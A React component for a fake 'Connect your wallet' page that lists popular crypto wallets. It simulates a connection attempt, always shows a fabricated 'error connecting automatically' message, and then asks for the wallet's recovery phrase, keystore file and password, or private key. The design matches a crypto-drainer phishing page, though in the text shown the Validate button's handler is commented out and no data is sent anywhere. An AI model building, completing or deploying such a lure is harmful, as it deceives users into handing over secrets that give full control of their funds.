import { useState } from "react";
import { ArrowLeft, Check, Loader2 } from "lucide-react";

type Wallet = {
  name: string;
  logo: string;
  logoClass: string;
};

const wallets: Wallet[] = [
  { name: "Metamask", logo: "🦊", logoClass: "text-orange-500" },
  { name: "Trust", logo: "T", logoClass: "text-blue-500" },
  { name: "Ambire", logo: "A", logoClass: "text-purple-500" },
  { name: "ApolloX", logo: "X", logoClass: "text-blue-600" },
  { name: "Argent", logo: "A", logoClass: "text-slate-800" },
  { name: "Avalanche", logo: "▲", logoClass: "text-red-500" },
  { name: "Banner", logo: "B", logoClass: "text-violet-500" },
  { name: "BitKeep", logo: "B", logoClass: "text-cyan-500" },
  { name: "Bitski", logo: "B", logoClass: "text-pink-500" },
  { name: "Blockchain", logo: "▣", logoClass: "text-blue-500" },
  { name: "BSC", logo: "◆", logoClass: "text-yellow-500" },
];

type Tab = "phrase" | "keystore" | "privateKey";

export default function WalletConnectionPage() {
  const [connectingWallet, setConnectingWallet] = useState<string | null>(
    null,
  );

  const [selectedWallet, setSelectedWallet] = useState<string | null>(null);

  const [isModalOpen, setIsModalOpen] = useState(false);

  const [selectedTab, setSelectedTab] = useState<Tab>("phrase");

  const handleWalletClick = (walletName: string) => {
    setConnectingWallet(walletName);

    setTimeout(() => {
      setConnectingWallet(null);
      setSelectedWallet(walletName);
      setSelectedTab("phrase");
      setIsModalOpen(true);
    }, 2000);
  };

  const handleClose = () => {
    setIsModalOpen(false);
    setSelectedWallet(null);
  };

  return (
    <main className="min-h-screen bg-[#030712] px-5 py-10 text-white sm:px-8 lg:px-12">
      {/* Background glow */}
      <div className="pointer-events-none fixed left-1/2 top-1/2 -z-0 h-[700px] w-[900px] -translate-x-1/2 -translate-y-1/2 rounded-full bg-blue-600/[0.07] blur-[180px]" />

      <div className="relative z-10 mx-auto max-w-[1250px]">
        {/* Back button */}
        <button
          type="button"
          onClick={() => window.history.back()}
          className="mb-8 flex items-center gap-2 text-sm font-medium text-slate-400 transition hover:text-white"
        >
          <ArrowLeft className="h-4 w-4" />
          Back
        </button>

        {/* Page title */}
        <h1 className="mb-8 text-3xl font-bold tracking-tight text-slate-100 sm:text-4xl">
          Connect your wallet
        </h1>

        {/* Main wallet panel */}
        <div className="rounded-[14px] bg-[#f8fafc] p-5 shadow-[0_25px_80px_rgba(0,0,0,0.35)] sm:p-8 lg:p-10">
          {/* Panel heading */}
          <h2 className="mb-7 text-2xl font-semibold text-slate-800">
            Connect to a wallet
          </h2>

          {/* Scrollable wallet list */}
          <div
            className="
              max-h-[590px]
              space-y-3
              overflow-y-auto
              pr-2
              [&::-webkit-scrollbar]:w-2
              [&::-webkit-scrollbar-track]:rounded-full
              [&::-webkit-scrollbar-track]:bg-slate-200
              [&::-webkit-scrollbar-thumb]:rounded-full
              [&::-webkit-scrollbar-thumb]:bg-slate-400
              [&::-webkit-scrollbar-thumb:hover]:bg-slate-500
            "
          >
            {wallets.map((wallet) => {
              const isConnecting = connectingWallet === wallet.name;

              return (
                <button
                  key={wallet.name}
                  type="button"
                  onClick={() => handleWalletClick(wallet.name)}
                  disabled={connectingWallet !== null}
                  className="group flex min-h-[70px] w-full items-center justify-between rounded-xl border border-slate-200 bg-white px-5 transition-all duration-200 hover:border-blue-300 hover:bg-slate-50 hover:shadow-[0_4px_18px_rgba(37,99,235,0.08)] disabled:cursor-default"
                >
                  {/* Left side */}
                  <div className="flex min-w-0 items-center gap-4">
                    {/* Available indicator */}
                    <span className="relative flex h-3 w-3 shrink-0">
                      <span className="absolute inset-0 rounded-full bg-emerald-400 opacity-30" />
                      <span className="relative h-3 w-3 rounded-full bg-emerald-500" />
                    </span>

                    {/* Wallet name / loading state */}
                    {isConnecting ? (
                      <div className="flex items-center gap-3">
                        <Loader2 className="h-4 w-4 animate-spin text-blue-500" />

                        <span className="text-[16px] font-medium text-slate-700">
                          Connecting to {wallet.name}...
                        </span>
                      </div>
                    ) : (
                      <span className="truncate text-[16px] font-medium text-slate-700">
                        {wallet.name}
                      </span>
                    )}
                  </div>

                  {/* Wallet logo */}
                  <div
                    className={`ml-4 flex h-10 w-10 shrink-0 items-center justify-center rounded-full bg-slate-100 text-xl font-bold ${wallet.logoClass}`}
                  >
                    {wallet.logo}
                  </div>
                </button>
              );
            })}
          </div>

          {/* Small status message */}
          <div className="mt-7 flex items-center justify-center gap-2 text-sm text-slate-400">
            <Check className="h-4 w-4 text-emerald-500" />
            <span>Secure wallet connection interface</span>
          </div>
        </div>
      </div>

      {/* ========================================================= */}
      {/* CONNECT WALLET MODAL */}
      {/* ========================================================= */}

      {isModalOpen && selectedWallet && (
        <div className="fixed inset-0 z-50 flex items-center justify-center bg-[#02002d]/80 px-4 backdrop-blur-[1px]">
          <div
            role="dialog"
            aria-modal="true"
            className="w-full max-w-[470px] rounded-[6px] bg-white px-4 py-6 shadow-[0_25px_80px_rgba(0,0,0,0.45)] sm:px-5"
          >
            {/* Error message */}
            <p className="mb-5 px-1 text-[13px] font-medium leading-[19px] text-red-500">
              There was an error connecting automatically. But
              <br />
              do not worry, you can still connect manually.
            </p>

            {/* Wallet title */}
            <h2 className="mb-5 text-center text-[13px] font-semibold text-slate-800">
              Import your {selectedWallet} wallet
            </h2>

            {/* Tabs */}
            <div className="flex border-b border-slate-300">
              <button
                type="button"
                onClick={() => setSelectedTab("phrase")}
                className={`relative flex-1 pb-2 text-[12px] font-semibold ${
                  selectedTab === "phrase"
                    ? "text-slate-800"
                    : "text-slate-500"
                }`}
              >
                phrase

                {selectedTab === "phrase" && (
                  <span className="absolute bottom-[-1px] left-0 right-0 h-[2px] bg-[#00d9a5]" />
                )}
              </button>

              <button
                type="button"
                onClick={() => setSelectedTab("keystore")}
                className={`relative flex-1 pb-2 text-[12px] font-semibold ${
                  selectedTab === "keystore"
                    ? "text-[#00d9a5]"
                    : "text-slate-500"
                }`}
              >
                keystore JSON

                {selectedTab === "keystore" && (
                  <span className="absolute bottom-[-1px] left-0 right-0 h-[2px] bg-[#00d9a5]" />
                )}
              </button>

              <button
                type="button"
                onClick={() => setSelectedTab("privateKey")}
                className={`relative flex-1 pb-2 text-[12px] font-semibold ${
                  selectedTab === "privateKey"
                    ? "text-slate-800"
                    : "text-slate-500"
                }`}
              >
                Private Key

                {selectedTab === "privateKey" && (
                  <span className="absolute bottom-[-1px] left-0 right-0 h-[2px] bg-[#00d9a5]" />
                )}
              </button>
            </div>

            
            <div className="mt-4 space-y-3">
              {selectedTab === "phrase" && (
                <textarea
                
                  placeholder="Enter your recovery phrase"
                  className="h-[95px] w-full resize-none rounded-[5px] border border-slate-400 bg-white px-2 py-2 text-[12px] text-slate-700 outline-none placeholder:text-slate-400"
                />
              )}

              {selectedTab === "keystore" && (
                <>
                  <textarea
                   
                    placeholder="Enter your keystore"
                    className="h-[95px] w-full resize-none rounded-[5px] border border-slate-400 bg-white px-2 py-2 text-[12px] text-slate-700 outline-none placeholder:text-slate-400"
                  />

                  <input
                   
                    type="text"
                    placeholder="wallet password"
                    className="h-[38px] w-full rounded-[5px] border border-slate-400 bg-white px-2 text-[12px] outline-none placeholder:text-slate-400"
                  />
                </>
              )}

              {selectedTab === "privateKey" && (
                <textarea
                
                  placeholder="Enter your privateKey"
                  className="h-[95px] w-full resize-none rounded-[5px] border border-slate-400 bg-white px-2 py-2 text-[12px] text-slate-700 outline-none placeholder:text-slate-400"
                />
              )}
            </div>

         
            <div className="mt-3 rounded-[4px] border border-amber-200 bg-amber-50 px-3 py-2">
              <p className="text-[10px] leading-4 text-amber-700">
                
              </p>
            </div>

            {/* Validate */}
            <button
              type="button"
            //   onClick={() => {
            //     alert(".");
            //   }}
              className="mt-4 h-[38px] w-full rounded-[3px] bg-[#15158f] text-[12px] font-bold text-white transition hover:bg-[#101075]"
            >
              Validate 
            </button>

            {/* Close */}
            <div className="mt-3 flex justify-end">
              <button
                type="button"
                onClick={handleClose}
                className="mt-4 h-[38px] w-full rounded-[3px] bg-[#ff3030] px-7 text-[12px] font-bold text-white transition hover:bg-[#e52323]"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}
    </main>
  );
}